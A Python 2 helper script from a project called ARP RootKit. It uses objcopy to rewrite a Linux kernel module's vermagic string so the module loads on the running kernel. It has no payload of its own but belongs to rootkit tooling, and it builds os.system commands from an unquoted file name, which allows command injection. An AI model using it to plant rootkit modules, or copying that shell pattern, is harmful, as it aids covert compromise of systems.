#!/usr/bin/python
#
# License:
#
# Copyright (c) 2018 Abel Romero Perez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
# Description:
#
# Modifies the vermagic of a Linux Kernel Module, to be the same than
# the one defined in the running system.
#

import sys
import platform
import re
import os
import subprocess

if len(sys.argv) < 2:
	print sys.argv[0] + ": <module>"
	exit(-1)

module = sys.argv[1]

print "Detecting current vermagic ..."
new_vermagic = subprocess.check_output(["python", "extract-vermagic.py"]).rstrip()

sectfile = module + ".modinfo"

# dump .modinfo of LKM
os.system("objcopy --dump-section .modinfo=" + sectfile + " " + module)

# load dumped section file
f = open(sectfile, 'rb')
data = f.read()
f.close()

# remove sectfile
os.remove(sectfile)

# replace vermagic
pattern = "vermagic=([\S\s]*?)\x00"
regex = re.compile(pattern)
for match_obj in regex.findall(data):
	print "Replacing \"" + match_obj + "\" by \"" + new_vermagic + "\""

old_vermagic = match_obj

data = data.replace(old_vermagic, new_vermagic)

# save sectfile
f = open(sectfile, 'wb')
f.write(data)
f.close()

# patch LKM
os.system("objcopy --update-section .modinfo=" + sectfile + " " + module)

# remove sectfile
os.remove(sectfile)

print "Done!"
